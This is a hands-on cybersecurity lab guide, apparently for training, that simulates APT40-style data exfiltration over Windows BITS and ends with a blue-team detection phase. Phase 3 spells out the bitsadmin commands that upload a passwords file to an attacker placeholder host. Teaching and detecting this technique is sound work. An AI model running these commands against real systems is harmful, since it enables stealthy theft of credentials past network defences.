# Leviathan: BITS Exfiltration

# Windows & Ubuntu VMs

## The objective of this lab is to use the Windows Background Intelligent Transfer Service (BITS) to stealthily exfiltrate sensitive data to a custom Command and Control (C2) server. You will learn how attackers blend in with legitimate system traffic and how to detect this "Living off the Land" technique.

---

### Documentation and scenario : 

**What is BITS?**

BITS (Background Intelligent Transfer Service) is a legitimate, built-in Windows component used by the system and applications to download or upload files asynchronously. It is most famously used by Windows Update to fetch patches in the background without choking the user's network.

**Core Capabilities of BITS** :

   - *Asynchronous Transfer* :  It runs in the background and only transfers data when there is idle network bandwidth.
   - *Resilience* :  It automatically pauses and resumes transfers if the system reboots or the network connection drops.
   - *Trusted Process* :  BITS traffic is generated by the trusted `svchost.exe` process. Because of this, standard host firewalls usually allow its traffic outbound on port 80 and 443 by default.

If you want to dive a bit deeper, check the [Microsoft BITS Documentation](https://learn.microsoft.com/en-us/windows/win32/bits/background-intelligent-transfer-service-portal)

>[!NOTE]
>In the cybersecurity landscape, BITS is a prime target for **"Living off the Land" (LotL)** attacks. Threat actor groups, such as **Leviathan (APT40)**, abuse this built-in tool to download malware or exfiltrate stolen data. Because the traffic looks like legitimate Windows updates, it easily bypasses network intrusion detection systems.


### **SCENARIO** : 

 - In this lab, we are simulating a stealthy data exfiltration attack. *The Ubuntu VM acts as the attacker's Command & Control (C2) Server*, while *the Windows VM represents a compromised machine within a corporate network*.

 - To successfully steal sensitive data without triggering the company's Egress Firewalls, **we will use `bitsadmin` to create a malicious upload job directed at our Ubuntu C2 server over HTTP (Port 80)**.

 - **Why are we doing this?** By routing our exfiltration through BITS, the stolen data is encapsulated in a protocol that network defenders expect to see. To the firewall, it simply looks like Windows communicating with an update server.

>[!IMPORTANT]
> **You** will start on the Ubuntu VM to set up the listener, and then move to the Windows VM. All tools and sensitive data meant to be exfiltrated are located in the **Lab Directory**.

### Phase 1 : Setup and Objective

We have access to a compromised *Windows 11* System, and we would like to exfiltrate a *"sensitive"* file containing user passwords. We will do that using **BITS**.

- First, open Windows PowerShell and navigate to the **Lab Directory**:

``` PowerShell
cd Desktop\Labs\LeviathanLab
```

- Let's take a look at the passwords.txt file. This is what we are going to use BITS to exfiltrate to the attacker's server (here represented by the Ubuntu VM):

### Phase 2: Staging the C2 Server

As an attacker, you need a server capable of understanding the specific protocol BITS uses for uploads. Standard web servers will reject BITS uploads by default, so we'll use a custom python C2 server using Flask.

- Open up an Ubuntu Shell terminal:

- Navigate to the Lab Directory and start the C2 Python server. We need to run it with sudo because BITS prefers standard HTTP port 80.


``` Bash
cd ~/Desktop/LeviathanLab
sudo python3 c2_server.py --port 80
```
>[!NOTE]
>Copy your '<UBUNTU_IP>', you will need it to know where to exfiltrate the data from the Windows machine. Keep this terminal open to watch the logs!

### Phase 3: Exfiltration via BITS

Now we switch to the compromised Windows machine. **We don't need to download any malware**; the tool we need (*bitsadmin.exe*) is already built into the operating system.

- Open a PowerShell terminal. We will create a BITS job named "exfil" and configure it as an upload task.


``` powershell
bitsadmin /create /upload exfil
```

- Next, we add our sensitive file to the job. The first argument is the remote attacker URL, and the second is the local path of the file. Make sure to replace <UBUNTU_IP> with your actual Ubuntu IP address:

``` powershell
bitsadmin /addfile exfil http://<UBUNTU_IP>/upload/passwords.txt "C:\Users\victim\Desktop\Labs\LeviathanLab\passwords.txt"
```

Finally, start the transfer. BITS will now take over and quietly push the file to the Ubuntu server.

``` PowerShell
bitsadmin /resume exfil
```

### Phase 4: Verification

Let's verify that the data successfully reached the attacker:

- Go back to your Ubuntu VM and look at the terminal running the C2 server. You should see logs indicating a BITS SESSION CREATED, followed by the chunk transfers, and finally a TRANSFER COMPLETE message.

- Open a web browser on your Ubuntu VM and navigate to the C2 Dashboard:

```
http://127.0.0.1/status
```

You will see a JSON output confirming that passwords.txt has been received.

### Phase 5: Blue Team Detection

>[!IMPORTANT]
>Because the network traffic looked completely legitimate (HTTP traffic from svchost.exe), the firewall did not generate any alerts. As a Blue Teamer, detection relies entirely on Endpoint Analysis.

- Open a NEW PowerShell terminal on the Windows machine. Let's hunt for suspicious BITS jobs:

- List all BITS jobs on the system. The /allusers flag is crucial, as attackers might run jobs under different accounts.


``` PowerShell
bitsadmin /list /allusers /verbose
```

    What are we looking at?

- In the verbose output, you can see a massive Indicator of Compromise (IoC):

    - The job name (exfil).

    - The suspicious remote URL pointing to a non-Microsoft IP address.

    - The local file path pointing to a sensitive document (passwords.txt).

    - Alternatively, modern Windows environments can query this easily via PowerShell cmdlets:


```PowerShell
Get-BitsTransfer -AllUsers | Select-Object JobId, DisplayName, JobState
``` 

### Cleanup

We're done! Let's clean up the environment to prevent the BITS job from lingering in the system queue.

- On the Windows VM, cancel the malicious BITS job to remove it from the system:


```PowerShell
bitsadmin /cancel exfil
```

- On the Ubuntu VM, go to the terminal running the Python C2 server and press CTRL+C to stop it.

**(Optional) Delete the received_files directory generated by the C2 server.**

### Conclusion

In this lab, you successfully executed a "Living off the Land" exfiltration using a built-in Windows service. You saw how BITS can bypass network defenses by masquerading as standard system updates. More importantly, you learned that when network detection fails, rigorous Endpoint Analysis—specifically monitoring BITS job queues and their destinations—is the key to catching advanced threat actors like Leviathan.
